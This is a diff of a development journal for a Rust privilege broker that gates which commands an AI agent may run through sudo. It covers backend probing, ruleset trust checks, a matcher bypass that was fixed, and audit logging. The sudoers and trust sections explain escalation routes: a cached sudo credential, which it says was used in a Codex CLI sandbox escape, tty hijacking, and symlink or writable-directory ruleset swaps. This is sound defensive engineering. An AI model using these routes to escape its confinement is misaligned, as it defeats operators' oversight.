@@ -3219,11 +3219,11 @@ tripwire working, not a regression.
 confirmation-prompt string since M1, flagged *(Still unwritten)* once the
 blocker (no renderer) was gone. They exist now, in two files:
 
-- **`aido-policy/tests/contract_snapshots.rs`** pins the strings a caller acts
+- **`xudo-policy/tests/contract_snapshots.rs`** pins the strings a caller acts
   on independent of any renderer: the denial-code wire contract (numeric code,
   string code, remediation — all three append-only) and every
   `ConfirmReason::explain()` prompt sentence.
-- **`aido/tests/render_snapshots.rs`** pins every verdict shape through both
+- **`xudo/tests/render_snapshots.rs`** pins every verdict shape through both
   rendered surfaces, `render::human` and `render::json`: the allow, all three
   confirmation reasons, and all eight denial codes — 24 snapshots.
 
@@ -3268,10 +3268,10 @@ the deny-list has no reason to touch.
 
 ## 2026-09-01 — phase 2, part three: the gate decides for itself
 
-### `aido-gate` is the second policy engine, and it reads the ruleset itself
+### `xudo-gate` is the second policy engine, and it reads the ruleset itself
 
 The gate is reached through `sudo` with **no arguments**, so it is written to
-one assumption: a hostile local user in the `aido` group runs it right now, with
+one assumption: a hostile local user in the `xudo` group runs it right now, with
 an empty argv, a hand-built environment, and a spool entry they wrote
 themselves. Four pure modules — `request` (is this a live entry from *this*
 caller?), `decide` (does root's ruleset permit it?), `env` (a constant child
@@ -3302,10 +3302,10 @@ shape of a bypass, not a typo).
 Neither is exploitable. Both are the kind of wrongness that misleads the next
 reader, which in a privilege broker is its own cost.
 
-1. **`aido-policy/src/decision.rs` claimed exit codes 17, 18 and 19 "sit above
+1. **`xudo-policy/src/decision.rs` claimed exit codes 17, 18 and 19 "sit above
    the range shells use for signals so they cannot be confused with a killed
    child".** Backwards: the shell convention is `128 + signal`, i.e. 129–192,
-   which is *above* aido's codes. The codes themselves are fine — above the
+   which is *above* xudo's codes. The codes themselves are fine — above the
    `0`/`1`/`2` band a program uses for its own failures and below 128 — so the
    fix is the sentence, not the numbers. **Fixed**, along with the test that
    encoded the same error in its name and asserted only `> 16`; it now pins both
@@ -3325,7 +3325,7 @@ reader, which in a privilege broker is its own cost.
 
    Note for whoever reads this next: the JSON envelopes (`Decision`, `Record`,
    `PendingRequest`) are snake_case **deliberately**, and so are the keys in
-   `aido-config`'s settings file. Kebab-case is the *rule-file* vocabulary, not a
+   `xudo-config`'s settings file. Kebab-case is the *rule-file* vocabulary, not a
    workspace-wide serialization style. Do not "fix" the others to match.
 
 ### A `matches!` with one arm is an uncovered region
@@ -3349,7 +3349,7 @@ hand it a genuine `serde_json` error and exercise the arm.
 
 ### `cargo deny` rejects a path dependency with no version
 
-A new crate declaring `aido-policy = { path = "../aido-policy" }` fails
+A new crate declaring `xudo-policy = { path = "../xudo-policy" }` fails
 `cargo deny check bans` as a **wildcard dependency**, which is not obvious from
 the error's wording. Every in-workspace dependency needs
 `{ path = "...", version = "0.0.1" }`, exactly as the older crates already do.
@@ -3376,7 +3376,7 @@ the honest long-term fix is a rustup-managed install owning `~/.cargo/bin`.
 ### Verified on a real kernel for the first time
 
 ```
-$ ssh yamin.lol '/tmp/aido-test --rules /tmp/aido-rules doctor'
+$ ssh yamin.lol '/tmp/xudo-test --rules /tmp/xudo-rules doctor'
 platform     linux
 hints        4 recorded, 0 trusted
 backend      sudo (Sudo version 1.9.15p5)
@@ -3384,7 +3384,7 @@ backend caps 6 of 7 supported
              absent: rejects argument wildcards
 ```
 
-`platform linux` and four collected hints mean `aido-sys`'s `/proc` ancestry walk
+`platform linux` and four collected hints mean `xudo-sys`'s `/proc` ancestry walk
 and hint collection ran against a real kernel rather than a fixture tree. The
 backend line means the probe genuinely asked `sudo`.
 
@@ -3395,7 +3395,7 @@ cargo-zigbuild`; the target was already in `rust-toolchain.toml`.
 
 ### The probe is functional, not a version check
 
-This is the piece that turns `aido doctor` from UNUSABLE into a real answer, and
+This is the piece that turns `xudo doctor` from UNUSABLE into a real answer, and
 the technique matters more than the code.
 
 `sudo-rs` accepts directives it has not implemented and silently ignores them. So
@@ -3437,12 +3437,12 @@ behind a `Runner` trait with a fake, so every *decision* built on a probe result
 which directive text to send, how to read a refusal, which paths to interrogate —
 is covered on any platform.
 
-What is left is `crates/aido-sys/src/exec/host.rs`: the actual `fork` and pipe
+What is left is `crates/xudo-sys/src/exec/host.rs`: the actual `fork` and pipe
 plumbing, whose failure paths need the kernel to fail a read on a descriptor we
 own. That one file is excluded by regex, recorded in the `justfile` beside the two
 package exclusions. Coverage is still 100% with **no line-level waivers**.
 
-### `crates/aido-audit` — built before the gate, deliberately
+### `crates/xudo-audit` — built before the gate, deliberately
 
 A gate that executes before there is a record of what it executed is a gate whose
 first incident is unreconstructable. Pure: it builds records, chains them, and
@@ -3472,10 +3472,10 @@ loses the record it was about to write. If serialization ever failed, the fallba
 line still carries the sequence and hash, so the chain stays verifiable across the
 gap.
 
-### `aido audit verify` — the crate now has a consumer
+### `xudo audit verify` — the crate now has a consumer
 
 A crate with no caller is a crate whose interface has never been used in anger,
-so `aido audit <--log PATH>` landed with it. Four choices in it are deliberate:
+so `xudo audit <--log PATH>` landed with it. Four choices in it are deliberate:
 
 - **It reads, it never repairs.** A tool that can rewrite the evidence is a tool
   an attacker can use to launder it. There is no `--fix`.
@@ -3504,17 +3504,17 @@ bind the message before asserting. That is the project rule working as intended 
 prefer deleting an unreachable branch to waiving it — and it left 100% with no
 line-level waivers.
 
-### `aido-sys/trust.rs` — the precondition every other guarantee rests on
+### `xudo-sys/trust.rs` — the precondition every other guarantee rests on
 
 The policy engine is a pure function of the ruleset. So whoever can edit the
 ruleset decides what an agent may run, and checking the file's own owner and mode
 is not enough:
 
-- A **symlink** anywhere on the path redirects the load. `/etc/aido` owned by root
+- A **symlink** anywhere on the path redirects the load. `/etc/xudo` owned by root
   but *reachable* through a directory a user can write is a directory a user can
   replace.
-- A **writable ancestor** is the same attack one level up. If `/etc/aido` is
-  immaculate but `/etc` is group-writable, that group renames `aido` aside and
+- A **writable ancestor** is the same attack one level up. If `/etc/xudo` is
+  immaculate but `/etc` is group-writable, that group renames `xudo` aside and
   puts its own there. Nothing about the final file looks wrong afterwards.
 - A **group- or world-writable** file needs no attack at all.
 
@@ -3551,9 +3551,9 @@ lines rather than a waiver.
 ### Kernel 5 support: a ladder, not a floor
 
 Requested, and it forced a decision that was going to have to be made anyway.
-`aido` cannot require a 2025 kernel — Ubuntu 20.04 ships 5.4, Debian 11 ships
+`xudo` cannot require a 2025 kernel — Ubuntu 20.04 ships 5.4, Debian 11 ships
 5.10, RHEL 9 ships 5.14, and all three are still in service. So attestation is a
-**ladder** (`aido-sys/kernel.rs`), and the rung is reported by `doctor`:
+**ladder** (`xudo-sys/kernel.rs`), and the rung is reported by `doctor`:
 
 | Rung | Since | What the broker learns |
 |---|---|---|
@@ -3570,7 +3570,7 @@ is a handle to that specific process.
 So `PeerCredOnly` **cannot carry the agent path** — it withholds passwordless
 operation rather than authorising a race. That is invariant 2 applied to the
 kernel, and it is asserted directly rather than left to be inferred. An old kernel
-does not lose `aido`; a human typing a password is not relying on the broker
+does not lose `xudo`; a human typing a password is not relying on the broker
 knowing which process asked.
 
 `openat2` (5.6) degrades to one `openat(O_PATH|O_NOFOLLOW|O_DIRECTORY)` per
@@ -3584,14 +3584,14 @@ we cannot identify is treated as the oldest we support, never the newest.
 
 ### A real bypass, found by running the binary on a Linux host
 
-The first host run of `aido explain -- /usr/bin/systemctl restart nginx.service`
+The first host run of `xudo explain -- /usr/bin/systemctl restart nginx.service`
 came back `DENY … argument 0 ("/usr/bin/systemctl") does not satisfy no-pager`.
 The front-end was handing the **whole command** to the argument matcher, so:
 
 - the program was consumed as operand 0, and
 - a rule's `exe` was never compared against anything at all.
 
-Which means `aido explain -- restart nginx.service` — naming **no program** —
+Which means `xudo explain -- restart nginx.service` — naming **no program** —
 was ALLOWED by a rule for `/usr/bin/systemctl`. Not exploitable today, because
 nothing executes yet. It would have been the day the gate landed, and it is
 exactly the class of bug that is invisible in unit tests written against the same
@@ -3634,15 +3634,15 @@ Confirmed on the host: program named plus permitted argv → ALLOW; same argv wi
 
 Docker on `yamin.lol` runs as root without a password (that user is in the
 `docker` group), so the sudo / sudo-rs / doas matrix finally ran against real
-parsers. Three assumptions in `aido-backend` were wrong, and all three were the
+parsers. Three assumptions in `xudo-backend` were wrong, and all three were the
 same mistake: a property inferred from an implementation's *name* instead of
 asked.
 
 **1. sudo-rs was invisible.** Ubuntu's `sudo-rs` package installs
 `/usr/bin/sudo-rs` and `/usr/bin/visudo-rs`, and does **not** provide
 `/usr/bin/sudo`. `detect` probed only `/usr/bin/sudo`, so on a host whose one
-privilege tool was the stricter of the two implementations aido exists to
-support, `aido doctor` said *"no backend found — aido cannot operate on this
+privilege tool was the stricter of the two implementations xudo exists to
+support, `xudo doctor` said *"no backend found — xudo cannot operate on this
 machine."* Fail-closed, so not a hole; useless, though, on exactly the
 configuration the probe was written for. `BackendKind::SUDO_CANDIDATES` now lists
 both paths, `Backend` records the one it was found at, and every probe is asked
@@ -3650,14 +3650,14 @@ of that path — because a probe that guesses the path interrogates a binary tha
 is not installed and gets "no" to everything.
 
 **2. Every sudo-rs probe was failing for an invisible reason.** The probe
-fragment used `Defaults!AIDO_PROBE <directive>`, and sudo-rs 0.2.2 supports
+fragment used `Defaults!XUDO_PROBE <directive>`, and sudo-rs 0.2.2 supports
 **only global `Defaults`**. Measured, one directive at a time:
 
 ```
 Defaults timestamp_timeout=0        ACCEPTED
 Defaults use_pty                    ACCEPTED
 Defaults!ALIAS timestamp_timeout=0  REJECTED: unknown setting: 'ALIAS'
-Defaults:%aido timestamp_timeout=0  REJECTED: expected parameter
+Defaults:%xudo timestamp_timeout=0  REJECTED: expected parameter
 Defaults>root  timestamp_timeout=0  REJECTED: expected parameter
 Defaults@ALL   timestamp_timeout=0  REJECTED: expected parameter
 Defaults !setenv                    REJECTED: unknown setting: 'setenv'
@@ -3673,7 +3673,7 @@ capability**, because without a scope the only way to apply `timestamp_timeout=0
 and `use_pty` is to apply them to *every sudo user on the host* — and an
 installer that silently changes unrelated sudo behaviour is doing something the
 operator did not ask for. sudo-rs 0.2.2 is therefore refused, by name, with that
-reason. It is not weaker at enforcement; it cannot scope the directives aido
+reason. It is not weaker at enforcement; it cannot scope the directives xudo
 depends on.
 
 Making it required immediately broke the doas path, which was the useful part:
@@ -3688,7 +3688,7 @@ sudo-rs *accepts* an argument wildcard (the code said it refuses them). Both are
 now probed. The lesson is the one this crate was built around and still got
 wrong in two places: **ask the backend.**
 
-`aido install --dry-run` exists so any of this could be checked at all — the plan
+`xudo install --dry-run` exists so any of this could be checked at all — the plan
 and the generated snippet had no way out of the process. It refuses without
 `--dry-run`, because a subcommand named `install` that silently did nothing would
 be worse than no subcommand. `--show-contents` prints the file. Verified with the
@@ -3703,10 +3703,10 @@ not guessed at.
 
 ### Still not done in phase 2
 
-`aido-gate` itself, `openat2` resolution (the ancestor ownership walk it needs
+`xudo-gate` itself, `openat2` resolution (the ancestor ownership walk it needs
 now exists in `trust.rs`, but `openat2`'s `RESOLVE_NO_SYMLINKS` is what closes the
 race between checking and opening),
-`execveat`, executing the install plan, and the journald sink. `aido doctor` still
+`execveat`, executing the install plan, and the journald sink. `xudo doctor` still
 reports `exec path absent in this build`, and that remains accurate.
 
 Also: **the answers I asked for in `re.md` did not land.** The file was unchanged
@@ -3726,8 +3726,8 @@ install path to exercise.
 |---|---|---|
 | Linux environment | `yamin@yamin.lol`, SSH working | See host survey below |
 | `ido add` collision | `ido add` writes `AGENTS.md`; `ido queue` buffers a command | Update `todo/phase-4-ido.md` § Command surface, which listed this as unresolved |
-| One package or two | **One.** `ido` ships with `aido`, not separately installable | Simplifies phase 3: one `debian/`, one postinst. `ido` cannot be offered to someone who wants nothing to do with `aido`, which was the argument for two — overridden deliberately |
-| Distribution | Signed `.deb` on GitHub Releases; no apt repo yet | Phase 3 § 4 shrinks: no `aptly`/`reprepro`, no `aido-keyring`, no `gh-pages`. The checksum-verified one-liner becomes the documented install |
+| One package or two | **One.** `ido` ships with `xudo`, not separately installable | Simplifies phase 3: one `debian/`, one postinst. `ido` cannot be offered to someone who wants nothing to do with `xudo`, which was the argument for two — overridden deliberately |
+| Distribution | Signed `.deb` on GitHub Releases; no apt repo yet | Phase 3 § 4 shrinks: no `aptly`/`reprepro`, no `xudo-keyring`, no `gh-pages`. The checksum-verified one-liner becomes the documented install |
 | Queue file location | `$XDG_STATE_HOME` — "do whatever", so the existing behaviour stands | No change; `paths.rs` already does this and explains why |
 
 ### Host survey: yamin.lol
@@ -3773,7 +3773,7 @@ The **human path** could work with moderate effort: macOS ships `sudo` and honou
 mostly transfer. `use_pty` and `timestamp_timeout` exist there.
 
 The **agent path cannot**, as designed. It rests on a root-created cgroup scope
-under `aido.slice` that a same-uid process provably cannot write into. macOS has
+under `xudo.slice` that a same-uid process provably cannot write into. macOS has
 no cgroups, no `/proc`, no `openat2`, no `execveat`, and no pidfds. Attesting a
 caller would need an entirely different mechanism — Endpoint Security, or audit
 tokens over XPC — and that is its own threat model, not a port. Planned, not
@@ -3788,10 +3788,10 @@ now the one that matches. Anyone following that guidance wrote a rule that never
 fired. Corrected, along with a stale comment in `shipped_rules.rs` and the
 now-obsolete "M1 has no renderer" blocker on the `insta` snapshots.
 
-**The layered configuration reached `aido config` and nothing else.** `cli.rs`
+**The layered configuration reached `xudo config` and nothing else.** `cli.rs`
 passed `engine::Settings::default()` into every `evaluate`, so
 `confirm_agent_actions` and `frozen` were configurable on paper and fixed in
-practice — an operator would set a value, be shown it in `aido config`, and get
+practice — an operator would set a value, be shown it in `xudo config`, and get
 the default behaviour. Now `engine_settings()` loads the file and derives the
 engine's view, and a broken file fails closed on the deciding path rather than
 falling back silently to the defaults. The defaults are the *safe* values, so
@@ -3802,7 +3802,7 @@ Two smaller things fell out of that:
 
 - **`best_match` reported a freeze as "unknown action".** It kept only denials it
   considered informative, and `Frozen` was not on the list, so a frozen agent
-  running `aido explain` was told no rule defines the action — sending an
+  running `xudo explain` was told no rule defines the action — sending an
   operator hunting for a missing rule when the real cause was their own freeze.
   Now a freeze short-circuits, and the informative-code list is gone entirely:
   the first refusal is kept whatever it is, so a denial code added later cannot
@@ -3817,9 +3817,9 @@ Two smaller things fell out of that:
 
 ## 2026-08-28 — phase 5 part 1 done: the config layering foundation
 
-`crates/aido-config` now exists. 430 tests across the workspace, 100% coverage on
-lines, regions, and functions, zero line-level waivers, gate green. `aido config`
-and `aido config --schema` work.
+`crates/xudo-config` now exists. 430 tests across the workspace, 100% coverage on
+lines, regions, and functions, zero line-level waivers, gate green. `xudo config`
+and `xudo config --schema` work.
 
 This landed before `ido` and before M2b on purpose: precedence is the thing that
 is painful to retrofit, and doing it while there are only two consumers is much
@@ -3852,7 +3852,7 @@ used as an escape hatch** by a lower layer. There is a test for exactly that.
   is inert rather than surprising, so callers cannot corrupt the result by
   applying files in the wrong sequence.
 - **Compiled-in values are reported, not omitted.** `use_pty` appears in
-  `aido config` marked `<compiled-in>`, and setting it produces "compiled in and
+  `xudo config` marked `<compiled-in>`, and setting it produces "compiled in and
   cannot be configured" rather than "unknown key". An operator who tries deserves
   the real reason.
 - **`7 of 7` has an analogue here too**: an unrecognised key fails the *whole
@@ -3867,7 +3867,7 @@ isolation caught it: every fixture then shared one `config.toml` under
 `target/test-tmp`, so one test's file changed another test's result. That is a
 test smell revealing a real design smell — an implicit path relationship nobody
 asked for. Replaced with an explicit `--config-file`, defaulting to
-`/etc/aido/config.toml`.
+`/etc/xudo/config.toml`.
 
 ### `ido` paths are settled, ahead of building `ido`
 
@@ -3888,7 +3888,7 @@ matter. Decisions made, with tests:
 - **An empty or relative XDG value is treated as unset**, per the specification,
   which stops a relative `XDG_STATE_HOME` resolving against whatever directory
   the process happens to be in.
-- **`aido` has no user layer at all**, and a test walks every system path
+- **`xudo` has no user layer at all**, and a test walks every system path
   asserting none of them mentions a home directory or `.config`.
 
 ### Not done in this pass
@@ -3902,7 +3902,7 @@ path in its list.
 
 ## 2026-08-28 — M2a done. What it is, and one design change worth knowing
 
-`crates/aido-backend` now exists: 373 tests across the workspace, 100% coverage on
+`crates/xudo-backend` now exists: 373 tests across the workspace, 100% coverage on
 lines, regions, and functions, zero line-level waivers, full gate green.
 
 Four modules, all pure — they decide what to write and never write it:
@@ -3935,13 +3935,13 @@ config and ignores it.
 **Consequence you will see immediately.** `HostProbe::honours_directive` answers
 `false` for everything, because confirming a directive means writing a probe
 config and observing the result, which needs the process handling that lands with
-M2b. So on this machine `aido doctor` reports:
+M2b. So on this machine `xudo doctor` reports:
 
 ```
 backend      UNUSABLE: sudo-rs  is missing a required control (…)
 ```
 
-That is correct and deliberate. `aido` will not claim a control nobody has
+That is correct and deliberate. `xudo` will not claim a control nobody has
 verified, and the consequence of the gap is that it declines to install rather
 than installing something weaker than it advertises. It will start reporting a
 usable backend when the probe can actually run — in the VM.
@@ -3958,7 +3958,7 @@ honoured.
   file. A "everything present" special case would have been dead code pretending
   to be thoroughness, so `doctor` prints a count and then one line per absent
   capability, with no conditional at all.
-- **Uninstall never removes the `aido` group.** An operator may have granted
+- **Uninstall never removes the `xudo` group.** An operator may have granted
   membership for their own reasons, and revoking it on a package removal is a
   surprise in the other direction. It *does* remove the sudoers file and any
   stale candidate, because leaving a rule behind is a security defect.
@@ -3990,8 +3990,8 @@ M2 is the first milestone with a privileged path, and essentially all of it is L
 | M2 component | Runs on macOS? |
 |---|---|
 | `sudo` / `sudo-rs` / `doas` detection and capability probing | No — no such binaries, and the version banners differ |
-| Writing and validating `/etc/sudoers.d/aido` | No — no `visudo`, no sudoers |
-| `aido-gate` hardening: `close_range`, `openat2(RESOLVE_*)`, `execveat`, `PR_SET_NO_NEW_PRIVS`, `statfs` on `/proc` | No — none of these syscalls exist |
+| Writing and validating `/etc/sudoers.d/xudo` | No — no `visudo`, no sudoers |
+| `xudo-gate` hardening: `close_range`, `openat2(RESOLVE_*)`, `execveat`, `PR_SET_NO_NEW_PRIVS`, `statfs` on `/proc` | No — none of these syscalls exist |
 | journald audit sink | No |
 | The functional post-install probe (did the gate really run as uid 0?) | No |
 | The differential matrix across sudo / sudo-rs / OpenDoas | No |
@@ -4026,24 +4026,24 @@ M2a (done) → phase 4 `ido` (no privilege at all, no VM needed) → phase 5 con
 
 The sudoers snippet is the entire security boundary, and every one of these is a trap I encoded because it has bitten someone:
 
-- **The filename cannot contain a dot or end in `~`.** `sudo` silently ignores such files, which produces a working-looking install with no rule in effect. `/etc/sudoers.d/aido.conf` is the mistake.
-- **`visudo -cf` must be run on aido's own file explicitly.** `sudo-rs`'s `visudo` validates only `/etc/sudoers`, not the drop-in directory.
+- **The filename cannot contain a dot or end in `~`.** `sudo` silently ignores such files, which produces a working-looking install with no rule in effect. `/etc/sudoers.d/xudo.conf` is the mistake.
+- **`visudo -cf` must be run on xudo's own file explicitly.** `sudo-rs`'s `visudo` validates only `/etc/sudoers`, not the drop-in directory.
 - **sudo-rs ignores directives it does not support, with a warning.** So the install check must be *functional* — run the gate and confirm it executed as uid 0 — not a file-existence check. Ubuntu 26.04 ships sudo-rs by default, so this is the common case, not an edge case.
 - **`timestamp_timeout=0` is load-bearing.** Without it the agent path can ride a credential a human cached with an unrelated earlier `sudo`. That residual-timeout channel was used in a published Codex CLI sandbox escape.
 - **`use_pty`** is the fix for the TIOCSTI/TIOCLINUX tty-hijack class. Blocking individual ioctls is a losing game; TIOCLINUX has no equivalent of Linux 6.2's `dev.tty.legacy_tiocsti` knob.
 - **The gate takes zero arguments.** `sudo` closes fds ≥ 3, so a request channel cannot survive the hop, and sudoers cannot constrain argument *arity* — only "no arguments" or a trailing wildcard. Zero argv removes the entire sudoers-glob injection class from the trust path.
-- **The beta must not install the `NOPASSWD` rule or the `aido-gate-nopass` hardlink at all.** See `todo/phase-3-packaging-and-publish.md` § 1.
+- **The beta must not install the `NOPASSWD` rule or the `xudo-gate-nopass` hardlink at all.** See `todo/phase-3-packaging-and-publish.md` § 1.
 
 ### Open hole that becomes real in M2b
 
-`crates/aido/src/rules.rs` does **not** yet verify ownership and mode of the rule files. Today that is survivable: nothing can execute, so a tampered ruleset only makes `aido explain` print a wrong answer to a human who asked a question. **The moment an exec path exists, this is a privilege escalation.** It is a stated precondition of M2b, not a nice-to-have, and it needs `openat2` plus the ancestor walk — so it lands with the rest of the syscall work, in the VM.
+`crates/xudo/src/rules.rs` does **not** yet verify ownership and mode of the rule files. Today that is survivable: nothing can execute, so a tampered ruleset only makes `xudo explain` print a wrong answer to a human who asked a question. **The moment an exec path exists, this is a privilege escalation.** It is a stated precondition of M2b, not a nice-to-have, and it needs `openat2` plus the ancestor walk — so it lands with the rest of the syscall work, in the VM.
 
 ### Suggestions, ranked
 
 1. **Get a VM before writing gate syscalls.** Above.
 2. **Build `ido` next if you want progress today.** Zero privilege, zero VM, and it is the piece that makes the project useful to someone who would never enable a `NOPASSWD` rule.
 3. **Add the audit crate before the gate, not after.** A gate that executes before there is a tamper-evident record of what it executed is a gate whose first incident is unreconstructable. It is also pure enough to be fully testable here.
-4. **Decide the packaging question in `todo/README.md` § Open decisions** — one package or two for `aido`/`ido` — before phase 3, because it changes the maintainer scripts.
+4. **Decide the packaging question in `todo/README.md` § Open decisions** — one package or two for `xudo`/`ido` — before phase 3, because it changes the maintainer scripts.
 
 ---
 
@@ -4066,9 +4066,9 @@ The crash input is now a permanent regression test (`canonicalize_never_splits_a
 
 Getting coverage from 99% to 100% took an embarrassing number of attempts, and my first two diagnoses were wrong.
 
-I concluded that the `aido` package being both a library and a binary was double-counting coverage, and restructured into three packages on that basis. **The actual cause was stale `llvm-cov` profile data surviving a refactor.** `rm -rf target/llvm-cov target/llvm-cov-target` fixed it instantly.
+I concluded that the `xudo` package being both a library and a binary was double-counting coverage, and restructured into three packages on that basis. **The actual cause was stale `llvm-cov` profile data surviving a refactor.** `rm -rf target/llvm-cov target/llvm-cov-target` fixed it instantly.
 
-I kept the restructure, because it is independently justified — `aido-tests` is in the plan for M2's differential matrix, and it genuinely cannot run under the coverage harness since `cargo_bin` cannot find the relocated binary — but it was **not** the fix, and nobody should infer from the layout that lib+bin coverage is broken.
+I kept the restructure, because it is independently justified — `xudo-tests` is in the plan for M2's differential matrix, and it genuinely cannot run under the coverage harness since `cargo_bin` cannot find the relocated binary — but it was **not** the fix, and nobody should infer from the layout that lib+bin coverage is broken.
 
 `just verify` now purges coverage data first, and `CLAUDE.md` records why: a stale drop invites lowering a threshold instead of cleaning.
 
@@ -4082,7 +4082,7 @@ Four unreachable branches were **deleted rather than waived**:
 
 `PrivilegedOps` is injected into the CLI so "the platform cannot observe this caller" is exercised by a test rather than only on a broken machine.
 
-Two package-level exclusions remain, both recorded in the `justfile` with reasons: `aido-tests` and `aido-bin`.
+Two package-level exclusions remain, both recorded in the `justfile` with reasons: `xudo-tests` and `xudo-bin`.
 
 ### Tooling facts worth remembering
 
@@ -4099,7 +4099,7 @@ Two package-level exclusions remain, both recorded in the `justfile` with reason
 
 ## 2026-10-19 — the sixth `unsafe` block: `SO_PEERCRED`
 
-**Decided by the user.** `aido-sys-raw` gains `getsockopt(SO_PEERCRED)` as its fifth call and sixth block, and the published budget in `sys.rs` goes from 5 to 6 in the same commit.
+**Decided by the user.** `xudo-sys-raw` gains `getsockopt(SO_PEERCRED)` as its fifth call and sixth block, and the published budget in `sys.rs` goes from 5 to 6 in the same commit.
 
 **Why.** rustix 1.1.x decodes `SO_PEERCRED` with `assume_init` into a `UCred` whose `pid` is a `Pid(NonZeroI32)`. The kernel reports pid 0 for a datagram socket and for a peer outside the caller's pid namespace, so a safe rustix call is undefined behaviour on an answer the broker can be handed (verified against rustix 1.1.4 and 1.1.5 source in an earlier review). A broker that decodes a hostile peer's credentials must not have UB on the answer "nobody". The new call reads into a `#[repr(C)]` `PeerCred { pid: i32, uid: u32, gid: u32 }` (size and offsets asserted against `libc::ucred`, length checked after the call, a record the kernel never wrote refused), so zero is a value, not a trap. It is exposed as `Syscalls::peer_cred`; it does not decide what pid 0 means, which is the broker's call (step 2 switches to it). **Switched 2026-10-21:** the broker reads `SO_PEERCRED` only through it and refuses pid 0 as `PeerNotVisible`; rustix's `socket_peercred` is called nowhere, and is banned in `clippy.toml` and by a scan of every Rust file. See open item 8 of the M2b step 2 entry.
 
